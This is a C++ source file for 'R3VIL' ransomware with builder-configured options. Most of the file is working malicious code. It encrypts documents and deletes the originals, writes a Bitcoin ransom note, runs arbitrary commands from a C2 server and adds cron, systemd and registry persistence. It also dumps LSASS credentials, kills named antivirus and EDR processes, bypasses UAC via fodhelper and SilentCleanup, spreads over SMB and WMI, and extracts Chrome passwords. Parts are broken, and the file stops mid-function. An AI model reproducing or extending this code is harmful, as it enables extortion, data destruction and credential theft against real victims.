// r3vil.cpp - R3VIL Ransomware with FULL Custom Builder Support
#include <cryptopp/cryptlib.h>
#include <cryptopp/osrng.h>
#include <cryptopp/chachapoly.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/rsa.h>
#include <cryptopp/pkcspad.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <winternl.h>
#include <psapi.h>
#include <wbemidl.h>
#include <comdef.h>
#include <shellapi.h>
#include <dbghelp.h>           // MiniDumpWriteDump
#include <lm.h>                // NetWkstaGetInfo
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "netapi32.lib")
#else
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#endif

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <algorithm>
#include <cctype>
#include <filesystem>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <mutex>
#include <queue>
#include <condition_variable>
#include <functional>
#include <atomic>
#include <sstream>
#include <random>
#include <sqlite3.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "sqlite3.lib")
#include "src/network_mapper.h"
#include "src/ransom_gui.h"
#include "src/c2_communication.h"
#include "config.h"                    // ← Dari Builder

using namespace CryptoPP;
namespace fs = std::filesystem;
// Global C2 instance
C2Communication g_c2;
// Add these after the includes and before the global C2 instance
int g_encrypted_count = 0;
int g_failed_count = 0;
long long g_total_size = 0;
// ====================== KONFIGURASI DARI BUILDER ======================
// JANGAN redefine lagi! Langsung gunakan dari config.h

// ====================== KONFIGURASI LAIN ======================
const std::vector<std::string> TARGET_EXTENSIONS = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".rtf", ".odt", ".txt", ".csv",
    ".db", ".sql", ".mdb", ".accdb", ".sqlite", ".mdf", ".ldf", ".ora", ".dbf",
    ".psd", ".ai", ".dwg", ".dxf", ".svg", ".raw", ".jpg", ".png", ".gif", ".mp4", ".mov", ".avi", ".mkv",
    ".cpp", ".h", ".c", ".cs", ".java", ".py", ".js", ".ts", ".php", ".html", ".css", ".go", ".rs", ".swift",
    ".json", ".yaml", ".xml", ".conf", ".ini", ".env", ".key", ".pem", ".crt", ".p12", ".pfx",
    ".rb", ".erb", ".mp3", ".tsx", ".mjs", ".bmp", ".wav", ".mov", "backup.*", ".3gp",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".iso", ".vmdk", ".vhd", ".bak",
    ".qbb", ".qbw", ".tax", ".myo", ".pfx", ".crt", ".img", ".qcow"
};

const std::vector<std::string> ENCRYPTED_EXTENSIONS = { ".revil" };

const std::vector<std::string> EXCLUDE_KEYWORDS = {
    "winlogon.exe", ".dll", ".sys", ".exe", ".ini", "pagefile.sys", "hiberfil.sys",
    "config.h", "collect"
};

const std::string LOG_FILE = "affected_files.log";

const std::vector<std::string> CRITICAL_SKIP_PREFIXES = {
#ifdef _WIN32
    "C:\\Windows\\", "C:\\Program Files\\", "C:\\Program Files (x86)\\",
    "C:\\$Recycle.Bin\\", "C:\\System Volume Information\\",
    "C:\\PerfLogs\\", "C:\\Recovery\\"
#else
    "/bin/", "/sbin/", "/etc/", "/dev/", "/proc/", "/sys/", "/lib/", "/lib64/",
    "/usr/", "/var/log/", "/run/", "/boot/", "/root/.ssh/", "/etc/ssh/",
    "/snap/", "/var/lib/snapd/"
#endif
};

const std::string PUBLIC_KEY_FILE = "Public/rsa_public.der";

const std::vector<std::string> AV_EDR_PROCESSES = {
    // Microsoft Defender
    "MsMpEng.exe", "MsSense.exe", "Sense.exe", "MpCmdRun.exe",
    // CrowdStrike & SentinelOne
    "csfalcon.exe", "CSFalconService.exe", "sentinelagent.exe", "SentinelServiceHost.exe",
    // Kaspersky & Bitdefender
    "avp.exe", "avpui.exe", "vsserv.exe", "bdagent.exe",
    // Sophos & ESET
    "SophosFS.exe", "SophosHealth.exe", "ekrn.exe", "egui.exe",
    // Carbon Black & FireEye
    "cb.exe", "CbResponse.exe", "xagt.exe", "fireeye.exe",
    // Symantec & McAfee
    "ccSvcHst.exe", "rtvscan.exe", "McShield.exe", "mfefire.exe",
    // Monitoring Tools (Anti-Analysis)
    "ProcessHacker.exe", "procmon.exe", "wireshark.exe", "x64dbg.exe"
};

// ====================== GLOBAL MUTEX ======================
std::mutex log_mutex;

// ====================== THREAD POOL ======================
class ThreadPool {
private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex queue_mutex;
    std::condition_variable condition;
    std::atomic<bool> stop{false};

public:
    explicit ThreadPool(size_t threads = std::thread::hardware_concurrency() * 2) {
        for (size_t i = 0; i < threads; ++i) {
            workers.emplace_back([this] {
                while (true) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(queue_mutex);
                        condition.wait(lock, [this] { return stop || !tasks.empty(); });
                        if (stop && tasks.empty()) return;
                        task = std::move(tasks.front());
                        tasks.pop();
                    }
                    task();
                }
            });
        }
    }

    template<class F>
    void enqueue(F&& task) {
        {
            std::unique_lock<std::mutex> lock(queue_mutex);
            if (stop) return;
            tasks.emplace(std::forward<F>(task));
        }
        condition.notify_one();
    }

    ~ThreadPool() {
        stop = true;
        condition.notify_all();
        for (std::thread& worker : workers) {
            if (worker.joinable()) worker.join();
        }
    }
};

// ====================== HELPER FUNCTIONS ======================
std::string to_lower(const std::string& s) {
    std::string lower = s;
    std::transform(lower.begin(), lower.end(), lower.begin(), [](unsigned char c){ return std::tolower(c); });
    return lower;
}

bool ends_with(const std::string& str, const std::string& suffix) {
    if (suffix.size() > str.size()) return false;
    return str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}

bool should_encrypt(const std::string& filepath) {
    std::string filename = fs::path(filepath).filename().string();
    std::string lname = to_lower(filename);
    for (const auto& ext : ENCRYPTED_EXTENSIONS) if (ends_with(lname, ext)) return false;
    for (const auto& kw : EXCLUDE_KEYWORDS) if (lname.find(to_lower(kw)) != std::string::npos) return false;
    for (const auto& ext : TARGET_EXTENSIONS) if (ends_with(lname, ext)) return true;
    return false;
}

bool is_critical_path(const std::string& path) {
    std::string lpath = to_lower(path);
    for (const auto& prefix : CRITICAL_SKIP_PREFIXES) {
        if (lpath.find(to_lower(prefix)) == 0) return true;
    }
    return false;
}

std::vector<std::string> get_all_roots() {
    std::vector<std::string> roots = {".", "/home", "/", "/root"};
    return roots;
}

std::string exec_cmd(const std::string& cmd) {
    char buffer[256];
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return "";
    while (fgets(buffer, sizeof(buffer), pipe)) result += buffer;
    pclose(pipe);
    return result;
}


// ====================== C2 COMMAND HANDLER ======================
void handle_c2_command(const std::string& command) {
    std::cout << "[C2] Executing command: " << command << std::endl;
    g_c2.send_status("command_received", {{"command", command}});
    
    if (command == "stop" || command == "kill") {
        g_c2.send_status("stopping");
        exit(0);
    }
    else if (command == "status") {
        g_c2.send_status("reporting_status");
    }
    else if (command.find("exec:") == 0) {
        std::string cmd = command.substr(5);
        std::string result = exec_cmd(cmd);
g_c2.send_status("command_executed", {{"result", result.substr(0, 1000)}});
    }
    else if (command == "screenshot") {
        // Screenshot capture would go here
        g_c2.send_status("screenshot_taken");
    }
    else if (command == "dump_lsass") {
#ifdef _WIN32
        // dump_lsass() would be called here
        g_c2.send_status("lsass_dumped");
#endif
    }

else if (command == "collect_credentials") {
        g_c2.send_status("credentials_collecting");
    }
}





// ====================== EVASION ======================
bool is_proot_anlinux() {
    if (getenv("PROOT")) return true;
    if (access("/.dockerenv", F_OK) == 0) return true;
    std::string uname = exec_cmd("uname -a 2>/dev/null");
    if (uname.find("Android") != std::string::npos) return true;
    return false;
}

bool is_virtual_machine() {
    if (is_proot_anlinux()) return false;
    if (std::thread::hardware_concurrency() <= 2) return true;
    return false;
}

bool is_debugger_present() {
    std::ifstream status("/proc/self/status");
    std::string line;
    while (std::getline(status, line)) {
        if (line.find("TracerPid:") == 0) return std::stoi(line.substr(10)) != 0;
    }
    return false;
}

bool is_sandbox_environment() {
    if (is_proot_anlinux()) return false;
    if (std::thread::hardware_concurrency() <= 2) return true;
    std::string up = exec_cmd("cat /proc/uptime 2>/dev/null | awk '{print $1}' || echo '0'");
    if (!up.empty() && std::stod(up) < 300) return true;
    return false;
}

void perform_evasion_checks() {
    std::cout << "[*] Running anti-analysis & evasion checks...\n";
    if (getenv("REVIL_BYPASS")) {
        std::cout << "[!] Evasion bypass activated (REVIL_BYPASS=1)\n";
        return;
    }
    if (is_proot_anlinux()) {
        std::cout << "[!] AnLinux / proot environment detected → Evasion bypassed.\n";
        return;
    }

    if (is_virtual_machine() || is_debugger_present() || is_sandbox_environment()) {
        std::cout << "[!] Suspicious environment detected! Exiting silently...\n";
        std::this_thread::sleep_for(std::chrono::seconds(3));
        exit(0);
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(800, 2500);
    std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));

    std::cout << "[✓] Evasion checks passed.\n";
}

// ====================== PERSISTENCE MANAGER ======================
class PersistenceManager {
private:
    std::string current_exe;

    std::string get_current_exe() {
#ifdef _WIN32
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
#else
        char path[1024];
        ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
        if (len != -1) {
            path[len] = '\0';
            return std::string(path);
        }
        return "";
#endif
    }

public:
    PersistenceManager() {
        current_exe = get_current_exe();
    }

    bool try_escalate_privileges() {
#ifdef __linux__
        if (geteuid() == 0) {
            std::cout << "[✓] Already running as ROOT\n";
            return true;
        }
        std::cout << "[!] Trying privilege escalation...\n";
        setenv("REVIL_ESCALATED", "1", 1);
        execlp("pkexec", "pkexec", current_exe.c_str(), nullptr);
        system(("sudo " + current_exe).c_str());
        exit(1);
#endif
        return false;
    }

    void install_all() {
        std::cout << "[*] Installing persistence mechanisms...\n";
#ifdef _WIN32
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "WindowsUpdateSvc", 0, REG_SZ, (BYTE*)current_exe.c_str(), current_exe.size() + 1);
            RegCloseKey(hKey);
            std::cout << "[✓] Registry Run persistence added\n";
        }
        char startup[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup);
        std::string startup_path = std::string(startup) + "\\SystemHelper.exe";
        CopyFileA(current_exe.c_str(), startup_path.c_str(), FALSE);
        std::cout << "[✓] Startup folder persistence added\n";
#else
        std::string cron = "(crontab -l 2>/dev/null; echo \"*/10 * * * * " + current_exe + " >/dev/null 2>&1\") | crontab -";
        system(cron.c_str());
        std::cout << "[✓] Cron persistence installed\n";

        if (geteuid() == 0) {
            std::ofstream svc("/etc/systemd/system/revil-update.service");
            svc << "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n";
            svc << "[Service]\nType=simple\nExecStart=" << current_exe << "\nRestart=always\nRestartSec=60\n";
            svc << "[Install]\nWantedBy=multi-user.target\n";
            svc.close();
            system("systemctl daemon-reload 2>/dev/null && systemctl enable revil-update.service 2>/dev/null");
            std::cout << "[✓] Systemd persistence installed\n";
        }
#endif
    }
};

// ====================== WALLPAPER CHANGER ======================
class WallpaperChanger {
private:
    std::string create_ransom_wallpaper() {
        const char* home = getenv("HOME");
        if (!home) home = "/tmp";
        std::string ppm = std::string(home) + "/.ransom.ppm";
        std::string jpg = std::string(home) + "/.ransom.jpg";

        std::ofstream f(ppm, std::ios::binary);
        int w=800, h=500;
        f << "P6\n" << w << " " << h << "\n255\n";
        for (int y=0; y<h; y++) for (int x=0; x<w; x++) {
            unsigned char p[3];
            if (y<80 || y>h-80) {p[0]=0;p[1]=0;p[2]=0;}
            else if (x>100 && x<w-100 && y>150 && y<350) {p[0]=255;p[1]=255;p[2]=255;}
            else {p[0]=180;p[1]=0;p[2]=0;}
            f.write((char*)p,3);
        }
        f.close();
        system(("convert " + ppm + " " + jpg + " 2>/dev/null || cp " + ppm + " " + jpg).c_str());
        fs::remove(ppm);
        return jpg;
    }

public:
    void change_wallpaper() {
        std::cout << "[*] Changing wallpaper...\n";
        std::string wp = create_ransom_wallpaper();

#ifdef _WIN32
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wp.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        std::cout << "[✓] Windows wallpaper changed\n";
#else
        std::vector<std::string> cmds = {
            "gsettings set org.gnome.desktop.background picture-uri 'file://" + wp + "' 2>/dev/null",
            "xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/image-path -s '" + wp + "' 2>/dev/null",
            "feh --bg-scale '" + wp + "' 2>/dev/null"
        };
        bool ok = false;
        for (auto& c : cmds) if (system(c.c_str()) == 0) { ok = true; break; }
        if (ok) std::cout << "[✓] Linux wallpaper changed\n";
        else std::cout << "[!] Could not change wallpaper\n";
#endif
    }

    void create_readme_file() {
        std::string path;
#ifdef _WIN32
        char desk[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desk);
        path = std::string(desk) + "\\README_LOCKED.txt";
#else
        const char* home = getenv("HOME");
        if (!home) home = ".";
        path = std::string(home) + "/Desktop/README_LOCKED.txt";
#endif

        std::ofstream f(path);
        if (f) {
            f << "========================================\n";
            f << "     YOUR FILES HAVE BEEN ENCRYPTED     \n";
            f << "========================================\n\n";
            f << RANSOM_MESSAGE << "\n\n";
            f << "To recover: Send $" << RANSOM_AMOUNT << " BTC to " << RANSOM_BTC << "\n";
            f << "Email transaction ID to " << RANSOM_EMAIL << "\n";
            f.close();
            std::cout << "[✓] README_LOCKED.txt created on Desktop\n";
        }
    }
};

// ====================== SELF-DELETE ======================
void self_delete() {
    std::cout << "[*] Self-delete activated...\n";
#ifdef _WIN32
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string cmd = "cmd.exe /c timeout 5 & del /f \"" + std::string(path) + "\"";
    system(cmd.c_str());
#else
    unlink("/proc/self/exe");
    std::cout << "[✓] Binary self-deleted.\n";
#endif
}

// ====================== STEALTH: NTDLL UNHOOKING ======================
#ifdef _WIN32
bool unhook_ntdll() {
    std::cout << "[*] Performing full NTDLL unhooking...\n";
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    char szNtdllPath[MAX_PATH];
    GetSystemDirectoryA(szNtdllPath, MAX_PATH);
    strcat_s(szNtdllPath, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(szNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD dwSize = GetFileSize(hFile, NULL);
    BYTE* pFresh = new BYTE[dwSize];
    DWORD dwRead;
    ReadFile(hFile, pFresh, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pFresh;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pFresh + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    BYTE* pTextFresh = nullptr;
    DWORD textSize = 0;
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; ++i) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            pTextFresh = pFresh + pSection[i].PointerToRawData;
            textSize = pSection[i].SizeOfRawData;
            break;
        }
    }

    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), hNtdll, &modInfo, sizeof(modInfo));
    BYTE* pTextHooked = (BYTE*)modInfo.lpBaseOfDll;

    DWORD oldProtect;
    VirtualProtect(pTextHooked, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pTextHooked, pTextFresh, textSize);
    VirtualProtect(pTextHooked, textSize, oldProtect, &oldProtect);

    delete[] pFresh;
    std::cout << "[+] NTDLL successfully unhooked\n";
    return true;
}
#endif

// ====================== REAL LSASS DUMP ======================
bool enable_debug_privilege() {
#ifdef _WIN32
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return false;

    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(hToken);
    return GetLastError() == ERROR_SUCCESS;
#else
    return false;
#endif
}

bool dump_lsass() {
#ifdef _WIN32
    if (!ENABLE_LSASS_DUMP) return false;

    std::cout << "[*] Attempting real LSASS credential dump...\n";

    if (!enable_debug_privilege()) {
        std::cout << "[!] Failed to enable SeDebugPrivilege\n";
        return false;
    }

    DWORD lsass_pid = 0;
    HANDLE hProcess = NULL;
    HANDLE hFile = NULL;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                    lsass_pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }

    if (lsass_pid == 0) {
        std::cout << "[!] Could not find LSASS process\n";
        return false;
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    if (!hProcess) {
        std::cout << "[!] Failed to open LSASS process\n";
        return false;
    }

    hFile = CreateFileA("lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cout << "[!] Failed to create lsass.dmp\n";
        CloseHandle(hProcess);
        return false;
    }

    BOOL success = MiniDumpWriteDump(hProcess, lsass_pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

    CloseHandle(hFile);
    CloseHandle(hProcess);

    if (success) {
        std::cout << "[+] LSASS dumped successfully → lsass.dmp\n";
        return true;
    } else {
        std::cout << "[!] LSASS dump failed\n";
        return false;
    }
#else
    return false;
#endif
}

// ====================== ENABLE RDP REMOTELY ======================
bool enable_rdp_remote(const std::string& target) {
#ifdef _WIN32
    if (!ENABLE_RDP_ABUSE) return false;

    std::cout << "[*] Attempting RDP enable on " << target << "\n";

    std::string cmd = "wmic /node:\"" + target + "\" process call create \"reg add \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\"";
    system(cmd.c_str());

    cmd = "wmic /node:\"" + target + "\" process call create \"sc config TermService start= auto\"";
    system(cmd.c_str());

    std::cout << "[+] RDP enable attempted on " << target << "\n";
    return true;
#else
    return false;
#endif
}

// ====================== DISABLE AV/EDR WINDOWS ======================
void disable_av_edr_windows() {
#ifdef _WIN32
    std::cout << "[*] Starting aggressive AV/EDR disable...\n";

    HKEY key; DWORD val = 1;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key) == ERROR_SUCCESS) {
        RegSetValueExA(key, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(key);
    }

    // Matikan Tamper Protection via registry (lebih aman)
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Features", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        DWORD tamper = 0;
        RegSetValueExA(hKey, "TamperProtection", 0, REG_DWORD, (BYTE*)&tamper, sizeof(tamper));
        RegCloseKey(hKey);
    }

    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true\" 2>nul");

    for (const auto& proc : AV_EDR_PROCESSES) {
        std::string cmd = "taskkill /f /im \"" + proc + "\" >nul 2>&1";
        system(cmd.c_str());
    }

    system("net stop WinDefend /y 2>nul");
    system("net stop Sense /y 2>nul");
    system("sc config WinDefend start= disabled 2>nul");

    std::cout << "[!] AV/EDR disable attempts completed\n";
#endif
}


// ====================== BYPASS UAC (Real & Working 2026) ======================
bool bypass_uac() {
#ifdef _WIN32
    std::cout << "[*] Attempting silent UAC Bypass...\n";

    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);

    // --- Method 1: Fodhelper (paling reliable) ---
    HKEY hKey = NULL;
    LONG res = RegCreateKeyExA(HKEY_CURRENT_USER, 
        "Software\\Classes\\ms-settings\\Shell\\Open\\command", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

    if (res == ERROR_SUCCESS) {
        std::string cmd = std::string(self_path) + " --elevated";

        RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)cmd.c_str(), (DWORD)cmd.size() + 1);
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
        RegCloseKey(hKey);

        // Jalankan fodhelper.exe (auto-elevated)
        ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);

        std::cout << "[+] fodhelper UAC Bypass triggered...\n";
        Sleep(2000);  // Beri waktu proses elevated muncul

        // Bersihkan registry
        RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command");

        if (IsUserAnAdmin()) {
            std::cout << "[+] UAC Bypass SUCCESS! Running as Administrator.\n";
            return true;
        }
    }

    // --- Method 2: SilentCleanup (lebih stealthy, hijack environment variable) ---
    std::cout << "[*] Trying SilentCleanup fallback...\n";

    // Set environment variable windir ke payload kita
    std::string windir_payload = std::string(self_path);

    SetEnvironmentVariableA("windir", windir_payload.c_str());

    // Jalankan scheduled task SilentCleanup
    system("schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I >nul 2>&1");

    Sleep(2500);

    if (IsUserAnAdmin()) {
        std::cout << "[+] SilentCleanup UAC Bypass SUCCESS!\n";
        return true;
    }

    // Cleanup environment variable
    SetEnvironmentVariableA("windir", NULL);

    std::cout << "[!] All UAC Bypass attempts failed. Continuing without admin rights.\n";
    return false;
#else
    return false;
#endif
}


// ====================== ENCRYPT FILE ======================
void encrypt_file(const std::string& filepath, const SecByteBlock& key, const byte* iv_or_nonce) {
    try {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cout << "  [*] Encrypting (" << ENCRYPTION_METHOD << "): " << filepath << "\n";

        std::string plaintext;
        FileSource(filepath.c_str(), true, new StringSink(plaintext));

        std::string ciphertext;
        std::string encpath = filepath + FILE_EXTENSION;

        if (ENCRYPTION_METHOD == "XChaCha20Poly1305") {
            XChaCha20Poly1305::Encryption enc;
            enc.SetKeyWithIV(key, key.size(), iv_or_nonce, 24);
            StringSource(plaintext, true, new AuthenticatedEncryptionFilter(enc, new StringSink(ciphertext), false, 16));
            FileSink out(encpath.c_str());
            out.Put(iv_or_nonce, 24);
            out.Put(reinterpret_cast<const byte*>(ciphertext.data()), ciphertext.size());
            out.MessageEnd();
        } else { // AES256CBC
            CBC_Mode<AES>::Encryption enc;
            enc.SetKeyWithIV(key, key.size(), iv_or_nonce, 16);
            StringSource(plaintext, true, new StreamTransformationFilter(enc, new StringSink(ciphertext)));
            FileSink out(encpath.c_str());
            out.Put(iv_or_nonce, 16);
            out.Put(reinterpret_cast<const byte*>(ciphertext.data()), ciphertext.size());
            out.MessageEnd();
        }

        fs::remove(filepath);

        // Update statistics
        g_encrypted_count++;
        g_total_size += file_size;

        std::ofstream log(LOG_FILE, std::ios::app);
        if (log) log << filepath << " → " << encpath << "\n";

        std::cout << "  [✓] Encrypted: " << filepath << "\n";
    } catch (...) {
        std::lock_guard<std::mutex> lock(log_mutex);
        g_failed_count++;
        std::cout << "  [✗] Failed: " << filepath << "\n";
    }
}

void encrypt_directory(const std::string& root, const SecByteBlock& key, const byte* iv_or_nonce) {
    std::cout << "[*] Scanning: " << root << "\n";
    std::vector<std::string> files;
    try {
        for (const auto& e : fs::recursive_directory_iterator(root, fs::directory_options::skip_permission_denied)) {
            if (e.is_regular_file() && should_encrypt(e.path().string()) && !is_critical_path(e.path().string())) {
                files.push_back(e.path().string());
            }
        }
    } catch (...) {}
    if (files.empty()) return;

    ThreadPool pool(8);
    for (const auto& f : files) {
        pool.enqueue([&f, &key, iv_or_nonce]() { encrypt_file(f, key, iv_or_nonce); });
    }
}

// ====================== PERFORM LATERAL MOVEMENT ======================
void perform_lateral_movement(const SecByteBlock& key, const byte* iv_or_nonce) {
    if (!ENABLE_LATERAL_MOVEMENT) {
        std::cout << "[*] Lateral movement disabled by builder\n";
        return;
    }

    std::cout << "\n[*] Starting REAL AGGRESSIVE Lateral Movement...\n";

#ifdef _WIN32
    if (ENABLE_AV_DISABLE) disable_av_edr_windows();
    unhook_ntdll();

    if (ENABLE_LSASS_DUMP) {
        dump_lsass();
    }

    // Domain Awareness
    bool is_domain = false;
    LPWKSTA_INFO_101 pInfo = NULL;
    if (NetWkstaGetInfo(NULL, 101, (LPBYTE*)&pInfo) == NERR_Success) {
        if (pInfo->wki101_langroup && pInfo->wki101_langroup[0] != L'\0') {
            is_domain = true;
            std::cout << "[+] Domain detected\n";
        }
        NetApiBufferFree(pInfo);
    }

    std::vector<std::string> targets = advanced_network_discovery();

    ThreadPool pool(30);

    for (const auto& target : targets) {
        if (target == get_local_ip() || 
           target.find("127.") == 0 ||   // IP loopback (127.x.x.x)
           target.find("10.") == 0 ||     // IP privat kelas A (10.x.x.x)
           (target.find("172.") == 0 && std::stoi(target.substr(4, 3)) >= 16 && std::stoi(target.substr(4, 3)) <= 31) || // IP privat kelas B (172.16.x.x - 172.31.x.x)
           target.find("192.168.") == 0) // IP privat kelas C (192.168.x.x)
           continue;

        pool.enqueue([target, &key, iv_or_nonce, is_domain]() {
            std::this_thread::sleep_for(std::chrono::milliseconds(300 + (rand() % 1800)));

            std::string payload_name = "svchost_update.exe";
            std::string remote_path = "\\\\" + target + "\\C$\\Windows\\Temp\\" + payload_name;

            char self_exe[MAX_PATH];
            GetModuleFileNameA(NULL, self_exe, MAX_PATH);

            if (CopyFileA(self_exe, remote_path.c_str(), FALSE)) {
                std::cout << "[+] Payload copied to " << target << "\n";

                if (psexec_like_execute(target, "C:\\Windows\\Temp\\" + payload_name)) {
                    std::cout << "[+] PsExec SUCCESS → " << target << "\n";
                    return;
                }
                if (wmi_remote_execute(target, "C:\\Windows\\Temp\\" + payload_name)) {
                    std::cout << "[+] WMI SUCCESS → " << target << "\n";
                    return;
                }
                if (create_remote_scheduled_task(target, "C:\\Windows\\Temp\\" + payload_name)) {
                    std::cout << "[+] Scheduled Task SUCCESS → " << target << "\n";
                    return;
                }

                if (ENABLE_RDP_ABUSE && is_domain) {
                    enable_rdp_remote(target);
                }

                SHELLEXECUTEINFOA sei = { sizeof(sei) };
                sei.lpVerb = "open";
                sei.lpFile = ("\\\\" + target + "\\C$\\Windows\\Temp\\" + payload_name).c_str();
                sei.nShow = SW_HIDE;
                ShellExecuteExA(&sei);
            }
        });
    }

    std::cout << "[*] Real lateral movement propagation active...\n";

#else
    std::cout << "[*] Linux lateral movement (basic)\n";
#endif



std::string decrypt_chrome_password(const std::vector<BYTE>& encrypted_data) {
    DATA_BLOB input = { (DWORD)encrypted_data.size(), (BYTE*)encrypted_data.data() };
    DATA_BLOB output = { 0, NULL };
    
    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        std::string password((char*)output.pbData, output.cbData);
        LocalFree(output.pbData);
        return password;
    }
    return "";
}

void extract_browser_passwords() {
    std::cout << "[*] Extracting browser passwords...\n";
    std::string output;
    
    // Extract Chrome passwords
    char local_app_data[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_app_data);
    std::string chrome_login_db = std::string(local_app_data) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
    
    if (fs::exists(chrome_login_db)) {
        // Copy database to temp location (Chrome locks the file)
        std::string temp_db = std::string(getenv("TEMP")) + "\\chrome_login_temp.db";
        fs::copy_file(chrome_login_db, temp_db, fs::copy_options::overwrite_existing);
        
        sqlite3* db;
        if (sqlite3_open(temp_db.c_str(), &db) == SQLITE_OK) {
            const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
            sqlite3_stmt* stmt;
            
            if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
                output += "=== CHROME PASSWORDS ===\n";
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string url = (const char*)sqlite3_column_text(stmt, 0);
                    std::string username = (const char*)sqlite3_column_text(stmt, 1);
                    const void* password_blob = sqlite3_column_blob(stmt, 2);
                    int password_len = sqlite3_column_bytes(stmt, 2);
                    
